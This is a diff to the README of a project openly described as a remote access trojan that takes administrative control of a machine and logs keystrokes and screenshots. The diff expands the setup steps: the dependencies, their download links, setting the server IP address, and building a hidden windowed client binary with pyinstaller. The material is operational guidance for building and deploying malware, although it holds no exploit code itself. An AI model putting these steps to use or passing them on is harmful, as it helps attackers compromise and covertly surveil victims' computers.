@@ -21,19 +21,37 @@ Created a remote access trojan that will establish administrative control over a
 9. Monitoring user behavior through keylogger capabilities (Keystrokes and Screenshots).
 
 # Requirements
-
-1. opencv
-2. numpy
-3. pyhook
-4. pyinstaller
+1. python 2.x
+2. opencv
+3. numpy
+4. pyhook
+5. pythoncom
+6. pyinstaller
 
 # Usage
+Clone the repo
+```
+git clone https://github.com/Lithium95/ConTroll_Remote_Access_Trojan.git
+```
 
-1. Install requirements.txt
+Navigate to pyinstaller folder and install pyinstaller
+```
+python setup.py install
+```
 
-2. Set ip_address. The ip_address is taken from the server's network
+Install opencv and numpy from requirements.txt
+```
+python -m pip install -r requirements.txt
+```
+pyHook download link
+http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/
 
-3. Use pyinstaller to build the client binary
+pythoncom download link
+http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/
+
+Set ip_address. The ip_address is taken from the server's network
+
+Use pyinstaller to build the client binary
 ```
 python pyinstaller.py --onefile --windowed --icon=icon.ico client.pyw
 ```
